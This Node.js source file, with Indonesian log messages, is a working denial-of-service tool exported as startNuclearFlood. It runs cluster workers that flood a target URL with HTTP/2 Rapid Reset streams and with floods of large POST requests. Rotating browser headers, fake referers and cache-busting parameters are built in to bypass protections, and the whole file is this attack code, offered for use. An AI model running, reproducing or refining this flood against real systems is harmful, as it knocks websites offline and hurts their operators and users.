const cluster = require('cluster');
const os = require('os');
const http = require('http'); // Diperlukan untuk agent kustom
const https = require('https'); // Diperlukan untuk agent kustom
const got = require('got');
const { CookieJar } = require('tough-cookie');
const url = require('url');
const crypto = require('crypto');

const headerPool = {
    chrome: {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    },
    firefox: {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    },
    edge: {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
        "sec-ch-ua": '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    },
    safari: {
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    }
};
const browserChoices = Object.keys(headerPool);

const referers = [
    "https://www.google.com/",
    "https://www.youtube.com/",
    "https://www.facebook.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
];

const acceptLanguages = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
];

function getBypassHeaders() {
    const browser = browserChoices[Math.floor(Math.random() * browserChoices.length)];
    const baseHeaders = headerPool[browser];

    const headers = {
        ...baseHeaders,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': referers[Math.floor(Math.random() * referers.length)],
        'upgrade-insecure-requests': '1',
    };

    return headers;
}

function generateComplexJsonPayload() {
    const data = {
        id: crypto.randomUUID(),
        timestamp: Date.now(),
        user: {
            userId: crypto.randomBytes(16).toString('hex'),
            session: crypto.randomBytes(32).toString('hex'),
            attributes: {}
        },
        data: [],
        metadata: {
            source: "synthetic-load-generator",
            traceId: crypto.randomUUID()
        }
    };
    for (let i = 0; i < 25; i++) {
        data.user.attributes[`attr_${i}`] = crypto.randomBytes(20).toString('hex');
        data.data.push({ key: crypto.randomBytes(10).toString('hex'), value: crypto.randomBytes(100).toString('hex') });
    }
    return JSON.stringify(data);
}

const payloadPool = [];
for (let i = 0; i < 50; i++) {
    payloadPool.push(generateComplexJsonPayload());
}
const getRandomPayload = () => payloadPool[Math.floor(Math.random() * payloadPool.length)];


function executeHttp2Attack(targetUrl, durationSeconds) { // This function runs in the worker process
    const streamsPerLoop = 500;
    let localSent = 0;
    let localError = 0;
    let loopCount = 0;
    const reportAfterLoops = 1000; // Send stats to master every 1000 loops (500,000 requests) for accuracy

    const target = url.parse(targetUrl);
    const cookieJar = new CookieJar();

    console.log(`Worker ${process.pid} memulai serangan HTTP/2 Rapid Reset ke ${target.host} selama ${durationSeconds} detik.`);

    let isAttackActive = true;
 
    const attack = () => {
        const cacheBustingUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`;
        const request = got(cacheBustingUrl, {
            http2: true,
            headers: getBypassHeaders(),
            timeout: 10000,
            retry: 0,
            cookieJar: cookieJar
        });

        request.on('request', (req) => {
            req.destroy();
        });

        localSent++;
        // Error diharapkan terjadi pada serangan rapid reset, jadi tidak dihitung.
        request.catch(() => {});
    };
 
    const attackLoop = () => {
        if (isAttackActive) {
            for (let i = 0; i < streamsPerLoop; i++) {
                attack();
            }

            loopCount++;
            if (loopCount >= reportAfterLoops) {
                if (process.send) {
                    process.send({
                        type: 'stats',
                        sent: localSent,
                        error: localError
                    });
                }
                localSent = 0;
                localError = 0;
                loopCount = 0;
            }

            setImmediate(attackLoop);
        }
    };

    attackLoop();
 
    setTimeout(() => {
        isAttackActive = false;

        // Send final batch of stats before exiting
        if (process.send && (localSent > 0 || localError > 0)) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: localError
            });
        }

        console.log(`Worker ${process.pid} telah menghentikan serangan ke ${target.host}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

function executeLegacyAttack(targetUrl, durationSeconds) {
    const streamsPerLoop = 400; // Menggunakan loop agresif, bukan delay
    let localSent = 0;
    let localError = 0;
    let loopCount = 0;
    const reportAfterLoops = 1250; // Kirim status setiap 400 * 1250 = 500,000 request untuk akurasi

    const target = url.parse(targetUrl);
    const cookieJar = new CookieJar();
    const protocol = target.protocol === 'https:' ? https : http;
    const agent = {
        http: new http.Agent({ keepAlive: true, maxSockets: streamsPerLoop + 50 }),
        https: new https.Agent({ keepAlive: true, maxSockets: streamsPerLoop + 50 }),
    };

    console.log(`Worker ${process.pid} memulai serangan Legacy Flood (Agresif) ke ${targetUrl} selama ${durationSeconds} detik.`);

    let isAttackActive = true;

    const attack = () => {
        const cacheBustingUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`;
        const payload = getRandomPayload();
        const headers = getBypassHeaders();
        
        localSent++;
        got.post(cacheBustingUrl, {
            headers: headers,
            body: payload,
            timeout: 10000,
            retry: 0,
            agent: agent,
            cookieJar: cookieJar
        }).catch((err) => {
            localError++;
        });
    };

    const attackLoop = () => {
        if (isAttackActive) {
            for (let i = 0; i < streamsPerLoop; i++) {
                attack();
            }

            loopCount++;
            if (loopCount >= reportAfterLoops) {
                if (process.send) {
                    process.send({
                        type: 'stats',
                        sent: localSent,
                        error: localError
                    });
                }
                localSent = 0;
                localError = 0;
                loopCount = 0;
            }
            setImmediate(attackLoop);
        }
    };

    attackLoop();

    setTimeout(() => {
        isAttackActive = false;

        if (process.send && (localSent > 0 || localError > 0)) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: localError
            });
        }

        console.log(`Worker ${process.pid} telah menghentikan serangan Legacy Flood (Agresif) ke ${targetUrl}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This function runs in the master process
    if (cluster.isPrimary) { // Master process logic
        console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
        
        cluster.settings = {
            exec: __filename,
            args: [targetUrl, String(durationSeconds)],
            execArgv: ['--max-old-space-size=1024']
        };

        let totalSent = 0;
        let totalError = 0;
        let secondsRemaining = durationSeconds;

        const monitorInterval = setInterval(() => {
            secondsRemaining -= 5;
            if (secondsRemaining < 0) secondsRemaining = 0;

            const successRate = totalSent > 0 ? ((totalSent - totalError) / totalSent * 100).toFixed(2) : "0.00";

            statusCallback({
                totalSent,
                totalError,
                successRate,
                secondsRemaining
            });

            if (secondsRemaining <= 0) {
                clearInterval(monitorInterval);
            }
        }, 5000);

        const numCPUs = Math.min(os.cpus().length, 2);
        
        for (let i = 0; i < numCPUs; i++) {
            const attackType = (i % 2 === 0) ? 'http2' : 'legacy';
            const worker = cluster.fork({ ATTACK_TYPE: attackType });
            worker.on('message', (message) => {
                if (message.type === 'stats') {
                    totalSent += message.sent || 0;
                    totalError += message.error || 0;
                }
            });
        }

        cluster.on('exit', (worker) => {
            console.log(`Worker ${worker.process.pid} telah berhenti.`);
        });

        const stopAttack = () => {
            console.log("Master menerima perintah stop. Menghentikan semua worker.");
            clearInterval(monitorInterval);
            for (const id in cluster.workers) {
                if (cluster.workers[id]) {
                    cluster.workers[id].kill();
                }
            }
        };

        return { stop: stopAttack };
    }
}

if (cluster.isWorker) { // Worker process logic
    const [targetUrl, durationSeconds] = process.argv.slice(2);
    const workerAttackType = process.env.ATTACK_TYPE;
    if (workerAttackType === 'legacy') {
        executeLegacyAttack(targetUrl, parseInt(durationSeconds, 10));
    } else {
        executeHttp2Attack(targetUrl, parseInt(durationSeconds, 10));
    }
}

module.exports = { startNuclearFlood };